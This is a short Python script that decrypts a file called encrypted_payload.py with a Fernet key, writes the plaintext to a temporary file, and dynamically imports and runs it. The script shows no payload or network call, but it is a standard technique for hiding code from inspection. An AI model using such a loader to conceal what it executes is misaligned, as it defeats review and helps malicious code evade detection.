import base64, os, importlib.util, tempfile
from cryptography.fernet import Fernet

# Load key
with open("key.txt", "rb") as f:
    key = f.read()

fernet = Fernet(key)

# Decrypt payload
with open("encrypted_payload.py", "rb") as f:
    encrypted = f.read()

decrypted = fernet.decrypt(encrypted)

# Run decrypted payload from temp file
temp_path = os.path.join(tempfile.gettempdir(), "temp_exec.py")
with open(temp_path, "wb") as f:
    f.write(decrypted)

spec = importlib.util.spec_from_file_location("_", temp_path)
module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(module)
module.run()
